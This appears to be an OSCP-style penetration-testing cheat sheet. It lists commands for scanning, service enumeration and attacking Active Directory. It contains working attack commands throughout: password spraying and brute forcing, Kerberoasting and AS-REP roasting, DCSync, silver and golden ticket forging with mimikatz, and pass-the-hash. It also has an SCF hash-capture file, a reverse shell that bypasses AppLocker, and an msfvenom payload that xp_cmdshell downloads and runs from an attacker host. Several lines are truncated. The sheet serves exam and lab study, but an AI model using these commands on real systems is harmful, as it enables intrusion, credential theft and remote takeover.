# 

# Port Scanning

#use -Pn option if you\'re getting nothing in scan

**nmap -sC -sV -T4 -oA nmap/initial ip**

nmap -sC -sV \<IP\> -v #Basic scan

Nmap -sV -sC -T4 -oA file IP \# basic scan

nmap -T4 -A -p- \<IP\> -v #complete scan

sudo nmap -sV -p 443 \--script \"vuln\" 192.168.50.124 #running vuln
category scripts

sudo nmap -sU -v 192.168.241.147 #scan UDP

#NSE

updatedb

locate .nse \| grep \<name\>

sudo nmap \--script=\"name\" \<IP\> #here we can specify other options
like specific ports\...e

Test-NetConnection -Port \<port\> \<IP\> #powershell utility

1..1024 \| % {echo ((New-Object Net.Sockets.TcpClient).Connect(\"IP\",
\$\_)) \"TCP port \$\_ is

# FTP enumeration

ftp \<IP\>

#login if you have relevant creds or based on nmpa scan find out whether
this has anonymo

put \<file\> #uploading file

get \<file\> #downloading file

#NSE

9/27/23, 11:00 AM OSCP Cheatsheet

https://md2pdf.netlify.app 15/36

locate .nse \| grep ftp

nmap -p21 \--script=\<name\> \<IP\>

#bruteforce

hydra -L users.txt -P passwords.txt \<IP\> ftp #\'-L\' for usernames
list, \'-l\' for username

#check for vulnerabilities associated with the version identified.

# SSH enumeration

#Login

ssh uname@IP #enter password in the prompt

#id_rsa or id_ecdsa file

chmod 600 id_rsa/id_ecdsa

ssh uname@IP -i id_rsa/id_ecdsa #if it still asks for password, crack
them using John

#cracking id_rsa or id_ecdsa

ssh2john id_ecdsa(or)id_rsa \> hash

john \--wordlist=/home/sathvik/Wordlists/rockyou.txt hash

#bruteforce

hydra -l uname -P passwords.txt \<IP\> ssh #\'-L\' for usernames list,
\'-l\' for username and

#check for vulnerabilities associated with the version identified.

# HTTP/S enumeration

-   View source-code and identify any hidden content. If some image
    > looks suspicious download and try to find hidden data in it.

-   Identify the version or CMS and check for active exploits. This can
    > be done using Nmap and Wappalyzer.

-   check /robots.txt folder

-   Look for the hostname and add the relevant one to /etc/hosts file.

-   Directory and file discovery - Obtain any hidden files which may
    > contain juicy information

-   dirbuster

```{=html}
<!-- -->
```
-   gobuster dir -u http://example.com -w /path/to/wordlist.txt

-   python3 dirsearch.py -u http://example.com -w /path/to/wordlist.txt

```{=html}
<!-- -->
```
-   Vulnerability Scanning using nikto: nikto -h \<url\>

```{=html}
<!-- -->
```
-   SSL certificate inspection, this may reveal information like
    > subdomains, usernames...etc

-   Default credentials, Identify the CMS or service ans check for
    > default credentials and test them out.

Bruteforce

-   hydra -L users.txt -P password.txt \<IP or domain\>
    > http-{post/get}-form \"/path:name=\^USER\^

\# Use https-post-form mode for https, post or get can be obtained from
Burpsuite. Also do

#Bruteforce can also be done by Burpsuite but it\'s slow, prefer Hydra!

-   if cgi-bin is present then do further fuzzing and obtain files like
    > .sh or .pl

-   Check if other services like FTP/SMB or anyothers which has upload
    > privileges are getting reflected on web.

-   API - Fuzz further and it can reveal some sensitive information

#identifying endpoints using gobuster

-   gobuster dir -u http://192.168.50.16:5002 -w
    > /usr/share/wordlists/dirb/big.txt -p pattern

#obtaining info using curl

-   curl -i http://192.168.50.16:5002/users/v1

If there is any Input field check for Remote Code execution or SQL
Injection

Check the URL, whether we can leverage Local or Remote File Inclusion.

Also check if thereʼs any file upload utility(also obtain the location
itʼs getting reflected)

# Subdomain Fuzz

wfuzz -u http://10.10.11.187 -H \"Host: FUZZ.flight.htb\" -w
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \--hh
7069

# 

# 

# Wordpress

\# basic usage

wpscan \--url \"target\" \--verbose

\# enumerate vulnerable plugins, users, vulrenable themes, timthumbs

wpscan \--url \"target\" \--enumerate vp,u,vt,tt \--follow-redirection
\--verbose \--log target.

\# Add Wpscan API to get the details of vulnerabilties.

# Drupal

droopescan scan drupal -u http://site

9/27/23, 11:00 AM OSCP Cheatsheet

https://md2pdf.netlify.app 18/36

# Joomla

droopescan scan joomla \--url http://site

sudo python3 joomla-brute.py -u http://site/ -w passwords.txt -usr
username

# DNS enumeration

-   host www.megacorpone.com

-   host -t mx megacorpone.com

-   host -t txt megacorpone.com

-   for ip in \$(seq 200 254); do host 51.222.169.\$ip; done \| grep -v
    > \"not found\"

-   dnsrecon -d megacorpone.com -t std #standard recon

-   dnsrecon -d megacorpone.com -D \~/list.txt -t brt #bruteforce, hence
    > we provided list

-   dnsenum megacorpone.com

-   nslookup mail.megacorptwo.com

-   nslookup -type=TXT info.megacorptwo.com 192.168.50.151 #we\'re
    > querying with specific IP

# SMTP enumeration

nc -nv \<IP\> 25 #Version Detection

-   smtp-user-enum -M VRFY -U username.txt -t \<IP\> \# -M means mode,
    > it can be RCPT, VRFY, EXP

#Sending email with valid credentials, the below is an example for
Phishing mail attack

-   sudo swaks -t user1@test.com -t user2@test.com \--from
    > user3@test.com \--server \<mail server\>

# NFS Enumeration

nmap -sV \--script=nfs-showmount \<IP\>

showmount -e \<IP\>

# SNMP Enumeration

snmpcheck -t \<IP\> -c public

snmpwalk -c public -v1 -t 10 \<IP\>

snmpenum -t \<IP\>

# 

# RPC Enumeration

rpcclient -U=user \$DCIP

rpcclient -U=\"\" \$DCIP #Anonymous login

##Commands within in RPCclient

srvinfo

enumdomusers #users

enumpriv #like \"whoami /priv\"

queryuser \<user\> #detailed user info

getuserdompwinfo \<RID\> #password policy, get user-RID from previous
command

lookupnames \<user\> #SID of specified user

createdomuser \<username\> #Creating a user

deletedomuser \<username\>

enumdomains

enumdomgroups

querygroup \<group-RID\> #get rid from previous command

querydispinfo #description of all users

netshareenum #Share enumeration, this only comesup if the current user
we\'re logged in ha

netshareenumall

lsaenumsid #SID of all users

# 

# **SMB Enumeration**

References :

-   [[https://medium.com/@taliyabilal765/smb-enumeration-guide-b2cb5cfb20e6]{.underline}](https://medium.com/@taliyabilal765/smb-enumeration-guide-b2cb5cfb20e6)

-   [[https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html#]{.underline}](https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html#)

-   [[https://gabb4r.gitbook.io/oscp-notes/service-enumeration/smb-enumeration]{.underline}](https://gabb4r.gitbook.io/oscp-notes/service-enumeration/smb-enumeration)

## **Nmap :** 

nmap -n -v -Pn -p139,445 -sV 192.168.0.101

\# Getting version information

nmap 192.168.0.101 \--script=smb-enum\*

nmap 192.168.0.101 \--script=smb-vuln\*

nmap 192.1688.0.101 \--script=smb-os\*

\# Scan with NSE Scripts

## **List Available Shares**

### **smbclient**

smbclient -L \\\\\\\\192.168.1.101\\\\

smbclient //10.10.10.100/shares -N

smbclient -N -L //10.10.11.236

\# Smbclient

smbclient -L //IP #or try with 4 /\'s

smbclient //server/share

smbclient //server/share -U \<username\>

mbclient //server/share -U domain/username

\# Will list all shares

smbclient -L \\\\\$ip \--option=\'client min protocol=NT1\'

\# if getting error \"protocol negotiation failed:
NT_STATUS_CONNECTION_DISCONNECTED\"

smbclient //HOST/PATH -c \'recurse;ls\'

\# List all files recursly

Download all file from smb :

root@kali# smbclient \--user r.thompson //10.10.10.182/data rY4n5eva

Try \"help\" to get a list of possible commands.

smb: \\\> mask \"\"

smb: \\\> recurse ON

smb: \\\> prompt OFF

smb: \\\> mget \*

### **smbmap**

smbmap -H \$ip

\# Will list all shares with available permissions

smbmap -H \$ip -R \$sharename

\# Recursively list dirs, and files

smbmap -u \'\' -p \'\' -H \$ip

smbmap -u guest -p \'\' -H \$ip

smbmap -u jsmith -p password1 -d workgroup -H 192.168.0.1

\# With credentials

### **Enum4linux:**

#### Try to enumerate all using following command:

-   enum4linux -a remote_host

#### Enumerate using login credentials:

-   enum4linux -u user_name -p password remote_host

#### Enumerate user list:

-   enum4linux -U remote_host

#### Getting OS information:

-   enum4linux -o remote_host

# 

# 

# **AD Enumeration**

## Traditional Approach : 

### **Enumerate all local account**

Net user , net user /domain

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image23.png){width="6.5in"
height="1.8888888888888888in"}

### **Enumerate all user entire in domain**

Net user nameofuser /domain

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image13.png){width="2.963542213473316in"
height="0.9150579615048119in"}

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image42.png){width="3.8281255468066493in"
height="2.5704877515310587in"}

### **Enumerate group in domain :** 

Net group /domain

# ![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image36.png){width="3.8913331146106738in" height="2.338542213473316in"}

### To check local administrators in domain joined machine

-   net localgroup Administrators

## **Enumerating Active Directory using PowerShell and .NET Classes**

To invoke the *Domain Class* and the *GetCurrentDomain* method, we\'ll
run the following command in PowerShell:

-   \[System.DirectoryServices.ActiveDirectory.Domain\]::GetCurrentDomain()

## Modern Approach

### Powerview 

Import-Module .\\PowerView.ps1 #loading module to powershell, if it
gives error then chang

Get-NetDomain #basic information about the domain

Get-NetUser #list of all users in the domain

\# The above command\'s outputs can be filtered using \"select\"
command. For example, \"Get-N

Get-NetGroup \# enumerate domain groups

Get-NetGroup \"group name\" \# information from specific group

Get-NetComputer \# enumerate the computer objects in the domain

Find-LocalAdminAccess \# scans the network in an attempt to determine if
our current user

Get-NetSession -ComputerName files04 -Verbose #Checking logged on users
with Get-NetSessi

Get-NetUser -SPN \| select samaccountname,serviceprincipalname \#
Listing SPN accounts in d

Get-ObjectAcl -Identity \<user\> \# enumerates ACE(access control
entities), lists SID(secur

Convert-SidToName \<sid/objsid\> \# converting SID/ObjSID to name

\# Checking for \"GenericAll\" right for a specific group, after
obtaining they can be conve

Get-ObjectAcl -Identity \"group-name\" \| ? {\$\_.ActiveDirectoryRights
-eq \"GenericAll\"} \| se

Find-DomainShare #find the shares in the domain

Get-DomainUser -PreauthNotRequired -verbose \# identifying AS-REP
roastable accounts

Get-NetUser -SPN \| select serviceprincipalname #Kerberoastable accounts

### Bloodhound

Collection methods - database

\# Sharphound - transfer sharphound.ps1 into the compromised machine

Import-Module .\\Sharphound.ps1

Invoke-BloodHound -CollectionMethod All -OutputDirectory \<location\>
-OutputPrefix \"name\"

\# Bloodhound-Python

bloodhound-python -u \'uname\' -p \'pass\' -ns \<rhost\> -d
\<domain-name\> -c all #output will b

Running Bloodhound

sudo neo4j console

\# then upload the .json files obtained

Or other method

first active the server with command

-   **\$ sudo neo4j console**

then launched the bloodhound and copy the **SharpHound.exe** into victim
machine using simple http server. running with command **SharpHound.exe
-c all**

then download file zip result from SharpHound using impacket-smbserver

-   **\$ impacket-smbserver kali .**

```{=html}
<!-- -->
```
-   **\*Evil-WinRM\* PS \> copy 20240211070801_BloodHound.zip
    > \\\\10.10.14.3\\kali\\20240211070801_BloodHound.zip**

### PsLoggedon

\# To see user logons at remote system of a domain(external tool)

.\\PsLoggedon.exe \\\\\<computername\>

## **Join Exchange Windows Permissions Group (Generic ALL)**

Because my user is in Service Account, which is a member of Privileged
IT Account, which is a member of Account Operators, it's basically like
my user is a member of Account Operators. And Account Operators has
**Generic All** privilege on the Exchange Windows Permissions group. If
I right click on the edge in Bloodhound, and select help, there's an
"Abuse Info" tab in the pop up that displays:

Step exploit :

Change grup permission from current login with Exchange Windows
Permissions with below command :

-   net user rana password /add /domain

-   net group \"Exchange Windows Permissions\" /add rana

-   wget http://10.10.14.70:5555/PowerView.ps1 -o PowerView.ps1

```{=html}
<!-- -->
```
-   Import-Module .\\PowerView.ps1

```{=html}
<!-- -->
```
-   \$SecPassword = ConvertTo-SecureString \'password\' -AsPlainText
    > -Force

```{=html}
<!-- -->
```
-   \$Cred = New-Object
    > System.Management.Automation.PSCredential(\'HTB.local\\rana',
    > \$SecPassword)

```{=html}
<!-- -->
```
-   Add-DomainObjectAcl -Credential \$Cred -TargetIdentity
    > \"DC=htb,DC=local\" -PrincipalIdentity rana -Rights DCSync

-   impacket-secretsdump htb.local/rana:\'password\'@10.10.10.161

-   

-   

```{=html}
<!-- -->
```
-   Add-DomainGroupMember -Identity \'Exchange Windows Permissions\'
    > -Members svc-alfresco; \$username = \"htb\\svc-alfresco\";
    > \$password = \"s3rvice\"; \$secstr = New-Object -TypeName
    > System.Security.SecureString; \$password.ToCharArray() \|
    > ForEach-Object {\$secstr.AppendChar(\$\_)}; \$cred = new-object
    > -typename System.Management.Automation.PSCredential -argumentlist
    > \$username, \$secstr; Add-DomainObjectAcl -Credential \$Cred
    > -PrincipalIdentity \'svc-alfresco\' -TargetIdentity
    > \'HTB.LOCAL\\Domain Admins\' -Rights DCSync

-   Then check the permission : net group \'Exchange Windows
    > Permissions\'

-   Then running try dcsync attack using this command :

-   secretsdump.py svc-alfresco:s3rvice@10.10.10.161

# Attacking Active Directory Authentication

## **Password Spraying**

**\# Crackmapexec - check if the output shows \'Pwned!\' this indicates
that *user* has administrative privileges on the target system.**

\- crackmapexec smb \<IP or subnet\> -u users.txt -p \'pass\' -d
\<domain\> \--continue-on-success

\- crackmapexec winrm \<IP or subnet\> -u users.txt -p \'pass\' -d
\<domain\> \--continue-on-success

\- crackmapexec rdp \<IP or subnet\> -u users.txt -p \'pass\' -d
\<domain\> \--continue-on-success

\# Kerbrute

kerbrute passwordspray -d corp.com .\\usernames.txt \"pass\"

wget
https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/User.txt

./kerbrute_linux_amd64 userenum \--dc EGOTISTICAL-BANK.local -d
EGOTISTICAL-BANK.local User.txt

## **AS-REP Roasting**

-   impacket-GetNPUsers -dc-ip \<DC-IP\> \<domain\>/\<user\>:\<pass\>
    > -request

-   impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile
    > hashes.asreproast corp.com/pete

-   .\\Rubeus.exe asreproast /nowrap #dumping from compromised windows
    > host

-   hashcat \--help \| grep -i \"Kerberos\"

-   hashcat -m 18200 hashes.txt wordlist.txt \--force \# cracking hashes

Or use this method

ASREPRoast is a security attack that exploits users who lack the
**Kerberos pre-authentication required attribute**.

[[https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast]{.underline}](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)

\- if port 389 is open, try use **ldapsearch** to enumeration user

**\$ ldapsearch -H ldap://10.10.10.161 -x -s base namingcontexts**

after found the namingcontexts try to enum the user using this command

**\$ ldapsearch -H ldap://10.10.10.161 -x -b DC=htb,DC=local
\"(objectClass=person)\" \| grep \"sAMAccountName:\"**

**ldapsearch -x -H ldap://10.10.191.152 -D \'oscp\\web_svc\' -w
\'Diamond1\' -b \"DC=oscp,DC=exam\" \> ldapsearch.txt**

**To filter only userlist :**

**\$ldapsearch -H ldap://10.10.10.182 -x -b DC=Cascade,DC=local
\"(objectClass=person)\" \| grep \"sAMAccountName:\" \| awk -F\': \'
\'{print \$2}\'**

**To grep password:**

**\$ldapsearch -H ldap://10.10.10.182 -x -b DC=Cascade,DC=local \| grep
"Pwd"**

or you can use the nmap nse script :

**\$ nmap -p 389 \--script ldap-search 10.10.10.161**

if port 445 or 139 open try to check the smb enumeration:

\$ **enum4linux IP**

after get the list the users try to check ASREPRoast attack using the
Impacket tool GetNPUsers.py to try to get a hash for each user,

\$ impacket-GetNPUsers Egotistical-bank.local/sauna -dc-ip 10.10.10.175
-request -no-pass

**\$ for user in \$(cat users); do GetNPUsers.py -no-pass -dc-ip
10.10.10.161 htb/\${user} \| grep -v Impacket; done**

after getting hash try to crack the password using hascat or john the
ripper

**\$ hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt
\--force**

after cracking password try use CrackmapExec for passwordspray against
all machines to find smb shares.

**\$ CrackmapExec.py smb 192.168.xxx.xxx -u users.txt -p \'pass\'**

**Or using evilwnrm**

## **Kerberoasting**

-   kerbrute userenum -d oscp.exam users.txt \--dc 10.10.130.15X

-   kerbrute passwordspray -d oscp.exam users.txt Password123 \--dc
    > 10.10.120.X -vvv

```{=html}
<!-- -->
```
-   impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS
    > -outputfile GetUserSPNs.out

```{=html}
<!-- -->
```
-   .\\Rubeus.exe kerberoast /outfile:hashes.kerberoast #dumping from
    > compromised windows host

```{=html}
<!-- -->
```
-   impacket-GetUserSPNs -dc-ip \<DC-IP\> \<domain\>/\<user\>:\<pass\>
    > -request #from kali machine

```{=html}
<!-- -->
```
-   hashcat -m 13100 hashes.txt wordlist.txt \--force \# cracking hashes

-   sudo hashcat -m 13100 GetUserSPNs.out
    > /usr/share/wordlists/rockyou.txt -r
    > /usr/share/hashcat/rules/best64.rule \--force

-   

-   

[[https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/active-writeup-w-o-metasploit]{.underline}](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/active-writeup-w-o-metasploit)

## Silver Tickets

Check current user has no access to the resource of the HTTP SPN mapped
to *iis_service*. To do so, we\'ll use
**iwr**[^[4]{.underline}^](https://portal.offsec.com/courses/pen-200-44065/learning/attacking-active-directory-authentication-46102/performing-attacks-on-active-directory-authentication-46172/silver-tickets-46109#fn-local_id_280-4)
and enter **-UseDefaultCredentials** so that the credentials of the
current user are used to send the web request.

iwr -UseDefaultCredentials [[http://web04]{.underline}](http://web04)

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image4.png){width="6.5in"
height="3.4027777777777777in"}

#Obtaining hash of an SPN user using Mimikatz

privilege::debug

sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here

#Obtaining Domain SID

ps\> whoami /user

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image29.png){width="5.520833333333333in"
height="1.75in"}

\# this gives SID of the user that we\'re logged in as. If the user SID
is \"S-1-5-21-198737

Forging silver ticket Ft Mimikatz

-   kerberos::golden /sid:\<domainSID\> /domain:\<domain-name\> /ptt
    > /target:\<targetsystem.domain\>

```{=html}
<!-- -->
```
-   kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369
    > /domain:corp.com /ptt /target:web04.corp.com /service:http
    > /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image20.png){width="6.5in"
height="4.916666666666667in"}

\# we can check the tickets by,

ps\> klist

Accessing service

ps\> iwr -UseDefaultCredentials \<servicename\>://\<computername\>

## **Domain Controller Synchronization**

## Secretsdump

-   secretsdump.py \<domain\>/\<user\>:\<password\>@\<IP\>

-   impacket-secretsdump administrator:\'hghgib6vHT3bVWf\'@10.10.120.X

-   impacket-secretsdump
    > oscp.exam/administrator:\'hghgib6vHT3bVWf\'@10.10.120.X

-   

## DCSync Attack 

first this is because **Abusing GenericAll Privilege on Exchange Trusted
Subsystem Group**

-   **net user /add pwnt P@ssw0rd /domain**

```{=html}
<!-- -->
```
-   **net group /add \'Exchange Trusted Subsystem\' pwnt /domain**

```{=html}
<!-- -->
```
-   wget http://10.10.14.70:5555/PowerView.ps1 -o PowerView.ps1

```{=html}
<!-- -->
```
-   Import-Module .\\PowerView.ps1

```{=html}
<!-- -->
```
-   \$SecPassword = ConvertTo-SecureString \'P@ssw0rd\' -AsPlainText
    > -Force

```{=html}
<!-- -->
```
-   \$Cred = New-Object
    > System.Management.Automation.PSCredential(\'HTB.local\\pwnt\',
    > \$SecPassword)

```{=html}
<!-- -->
```
-   Add-DomainObjectAcl -Credential \$Cred -TargetIdentity
    > \"DC=htb,DC=local\" -PrincipalIdentity pwnt -Rights DCSync

```{=html}
<!-- -->
```
-   **impacket-secretsdump htb.local/pwnt:\'P@ssw0rd\'@10.10.10.161**

```{=html}
<!-- -->
```
-   **impacket-psexec \"administrator\"@10.10.10.161 -hashes
    > ad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6**

# 

# Lateral Movement in Active Directory

## psexec - smbexec - wmiexec - atexec

Here we can pass the credentials or even hash, depending on what we have

psexec.py \<domain\>/\<user\>:\<password1\>@\<IP\>

\# the user should have write access to Admin share then only we can get
sesssion

psexec.py -hashes
\'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff\'
-dc-ip 10.10.10.175 administrator@10.10.10.175

#we passed full hash here

smbexec.py \<domain\>/\<user\>:\<password1\>@\<IP\>

smbexec.py -hashes
aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 \<dom

#we passed full hash here

wmiexec.py \<domain\>/\<user\>:\<password1\>@\<IP\>

wmiexec.py -hashes
aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 \<dom

#we passed full hash here

atexec.py -hashes
aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 \<doma

#we passed full hash here

## winrs

winrs -r:\<computername\> -u:\<user\> -p:\<password\> \"command\"

\# run this and check whether the user has access on the machine, if you
have access then

## crackmapexec

If stuck make use of Wiki

crackmapexec {smb/winrm/mssql/ldap/ftp/ssh/rdp} #supported services

crackmapexec smb 10.10.10.172 -u users -p users \--continue-on-success

crackmapexec smb 10.10.120.X -u users.txt -p Password123 \--local-auth
\--continue-on-success

crackmapexec smb 10.10.120.X -u users.txt -p Passwors123 -d \" \"

crackmapexec smb \<Rhost/range\> -u user.txt -p password.txt
\--continue-on-success \# Brutef

crackmapexec smb \<Rhost/range\> -u user.txt -p password.txt
\--continue-on-success \| grep \'

crackmapexec smb \<Rhost/range\> -u user.txt -p \'password\'
\--continue-on-success #Password

crackmapexec smb \<Rhost/range\> -u \'user\' -p \'password\' \--shares
#lists all shares, provid

crackmapexec smb \<Rhost/range\> -u \'user\' -p \'password\' \--disks

crackmapexec smb \<DC-IP\> -u \'user\' -p \'password\' \--users #we need
to provide DC ip

crackmapexec smb \<Rhost/range\> -u \'user\' -p \'password\' \--sessions
#active logon sessions

crackmapexec smb \<Rhost/range\> -u \'user\' -p \'password\' \--pass-pol
#dumps password policy

crackmapexec smb \<Rhost/range\> -u \'user\' -p \'password\' \--sam #SAM
hashes

crackmapexec smb \<Rhost/range\> -u \'user\' -p \'password\' \--lsa
#dumping lsa secrets

crackmapexec smb \<Rhost/range\> -u \'user\' -p \'password\' \--ntds
#dumps NTDS.dit file

crackmapexec smb \<Rhost/range\> -u \'user\' -p \'password\' \--groups
{groupname} #we can also

crackmapexec smb \<Rhost/range\> -u \'user\' -p \'password\' -x
\'command\' #For executing command

#crackmapexec modules

crackmapexec smb -L #listing modules

crackmapexec smb -M mimikatx \--options #shows the required options for
the module

crackmapexec smb \<Rhost\> -u \'user\' -p \'password\' -M mimikatz #runs
default command

crackmapexec smb \<Rhost\> -u \'user\' -p \'password\' -M mimikatz -o
COMMAND=\'privilege::debug'

## Pass the ticket

.\\mimikatz.exe

sekurlsa::tickets /export

kerberos::ptt
\[0;76126\]-2-0-40e10000-Administrator@krbtgt-\<RHOST\>.LOCAL.kirbi

klist

dir \\\\\<RHOST\>\\admin\$

## Golden Ticket

.\\mimikatz.exe

privilege::debug

lsadump::lsa /inject /name:krbtgt

kerberos::golden /user:Administrator /domain:controller.local
/sid:S-1-5-21-849420856-235

misc::cmd

klist

dir \\\\\<RHOST\>\\admin\$

# **Kerberos - UDP (and TCP) 88**

if port 88 is open try kerberos brute forcing :

note the username can generate from website if the ip has port 80 or
port 443 u can generate using cewl

**\$ cewl -d 2 -m 5 -w users.txt http://10.10.10.175/about.html**

**\$ kerbrute userenum -d EGOTISTICAL-BANK.LOCAL
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \--dc
10.10.10.175**

**tips after got initial access :**

**you can read this article :**

**[[https://sparshjazz.medium.com/hackthebox-forest-writeup-active-directory-51e009f347c5]{.underline}](https://sparshjazz.medium.com/hackthebox-forest-writeup-active-directory-51e009f347c5)**

# Hunting for Interesting ACEs

reference writeup check this out :
[[https://juggernaut-sec.com/hackthebox-forest/#Abusing_GenericAll_Privilege_on_Exchange_Trusted_Subsystem_Group]{.underline}](https://juggernaut-sec.com/hackthebox-forest/#Abusing_GenericAll_Privilege_on_Exchange_Trusted_Subsystem_Group)

Armed with this knowledge, I want to hunt for a group with interesting
ACE's.

-   **GenericAll** -- full rights to the object (add users to a group or
    > reset user's password)

-   **GenericWrite** -- update object's attributes (i.e logon script)

-   **WriteOwner** -- change object owner to attacker controlled user
    > take over the object

-   **WriteDACL** -- modify object's ACEs and give attacker full control
    > right over the object

-   **AllExtendedRights** -- ability to add user to a group or reset
    > password

-   **ForceChangePassword** -- ability to change user's password

-   **Self (Self-Membership)** -- ability to add yourself to a group

# 

-   

# smb tips : 

if port 445 or 139 open try to check the smb enumeration:

**\$ smbclient -N -L //IP**

**\$ smbclient -N //IP/sharenames**

**\$ smbclient -L IP**

**\$ smbmap -H 10.10.10.161**

**\$ rpcclient -U \"\" -N 10.10.10.161**

if we can't view the shared file in directory try to mount the directory
with comment

**sudo mount -t cifs -o "user=seek" //IP/shared_name /mnt/sync**

or

**sudo mount -t cifs -o rw,username=guest,password=
\'//10.10.10.103/Department Shares\' /mnt**

**then try to write**

We land in a share with a lot of folders, out of which some might be
writable. A small bash script can determine this.

**#!/bin/bash**

**list=\$(find /mnt -type d)**

**for d in \$list**

**do**

**touch \$d/x 2\>/dev/null**

**if \[ \$? -eq 0 \]**

**then**

**echo \$d \" is writable\"**

**fi**

**done**

or check using this script :

**\$ smbcacls -N \'//10.10.10.103/Department Shares\' Users/Public**

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image5.png){width="6.177083333333333in"
height="2.0in"}

if we login as guest :

**smbmap -u guest -d htb -H 10.10.10.103 -A \'(xlsx\|docx\|txt\|xml)\'
-R**

if we know username and password :

**smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.172 -A**

**\'(xlsx\|docx\|txt\|xml)\' -R**

## 

## SMB Share SCF file attack 

[[https://nored0x.github.io/red-teaming/smb-share-scf-file-attacks/]{.underline}](https://nored0x.github.io/red-teaming/smb-share-scf-file-attacks/)

[[https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/]{.underline}](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)

\[shell\]

Command=2

IconFile=\\\\10.10.16.2\\share\\test.ico

\[Taskbar\]

Command=ToggleDesktop

after get the hash crack the hash

**\$ john amanda-hash -w=/usr/share/wordlists/rockyou.txt**

To check SPN associated

**setspn -T htb.local -F -Q \*/\***

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image32.png){width="6.267716535433071in"
height="3.875in"}

after confirm spn found try to kerberos using rubeus like image below

PS C:\\Windows\\temp\> iwr -uri http://10.10.14.2:8000/Rubeus.exe -o
r.exe

PS C:\\Windows\\temp\> .\\r.exe kerberoast /creduser:htb.local\\amanda
/credpassword:Ashare1972

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image8.png){width="6.267716535433071in"
height="3.486111111111111in"}

# CLM / AppLocker Break Out

enumeration :

**PS htb\\amanda@SIZZLE Documents\>
\$executioncontext.sessionstate.languagemode**

**PS htb\\amanda@SIZZLE Documents\> Get-AppLockerPolicy -Effective
-XML**

[[PSByPassCLM]{.underline}](https://github.com/padovah4ck/PSByPassCLM)
is a good one for CLM breakout. I'll build it in a Windows VM making
sure to match the .NET version with what is on target (though I could
probably also just use the exe in
PSBypassCLM/PSBypassCLM/bin/x64/Debug), and upload the exe to the
\\appdata\\local\\temp directory for amanda.

Next I'll run with the revshell option:

**C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe
/logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.14.4
/rport=443 \\users\\amanda\\appdata\\local\\temp\\a.exe**

# **msbuild bypass**

[[https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/]{.underline}](https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/)

## 

# Local Port Forwarding

ssh -L 1433:10.10.126.148:1433 Administrator@192.168.236.147 -N

Then try login :

impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@127.0.0.1 -windows-auth
-port 1433

Rce via mssql :

![](vertopal_528d199b82d241d6abcc4565ee1c8434/media/image33.png){width="6.5in"
height="2.0416666666666665in"}

Or following this :

[[https://0xdf.gitlab.io/2022/10/01/htb-scrambled-beyond-root.html#get-execution-via-mssql]{.underline}](https://0xdf.gitlab.io/2022/10/01/htb-scrambled-beyond-root.html#get-execution-via-mssql)

Get full reverse shell :

Try reverse port forward

sudo ssh -R 10.10.126.147:7781:192.168.45.191:18890
administrator@192.168.236.147 -N

Create malicious exe :

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.126.147 LPORT=7781
EXITFUNC=thread -f exe \--platform windows -o rshell.exe

Then execute via mssql :

xp_cmdshell powershell \"Invoke-WebRequest -Uri
http://10.10.184.147:7781/rshell.exe -OutFile
c:\\Users\\Public\\rshell.exe\"

Dont forget to setup listoner to download file :

python3 -m http.server 18890

Then use netcat and exec

xp_cmdshell c:\\Users\\Public\\rshell.exe

nc -nlvp 18890

# **File transfer cheat sheet :**

-   [[https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/]{.underline}](https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/)

-   [[https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65]{.underline}](https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65)

```{=html}
<!-- -->
```
-   [[https://techmonger.github.io/3/linux-windows-ftp/]{.underline}](https://techmonger.github.io/3/linux-windows-ftp/)

## **File transfer cheat sheet**

-   [[https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/]{.underline}](https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/)

